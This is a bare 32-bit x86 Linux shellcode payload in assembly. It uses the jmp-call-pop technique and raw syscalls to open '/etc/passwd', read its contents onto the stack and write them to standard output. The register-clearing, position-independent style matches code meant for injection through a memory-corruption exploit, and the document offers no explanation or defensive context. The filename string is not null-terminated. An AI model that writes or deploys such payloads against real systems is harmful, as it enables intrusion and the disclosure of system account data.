bits 32
section .text
global _start

_start:
	
	jmp filename

	; open("/etc/passwd", O_RDONLY)
	open:

	xor eax, eax
	xor ecx, ecx
	mov al, 5
	pop ebx

	int 0x80

	mov ebx, eax

	; read(filefd, buf, 0x1337)

	mov al, 3
	mov edx, ecx
	mov dx, 0x1337
	sub sp, dx
	mov ecx, esp

	int 0x80

	; write(stdout, buf, len(buf))

	mov edx, eax
	xor eax, eax
	mov ebx, eax
	mov al, 4
	inc ebx

	int 0x80

	; exit(0)

	xor eax, eax
	mov al, 1
	xor ebx, ebx

	int 0x80

	filename:
		call open
		db "/etc/passwd"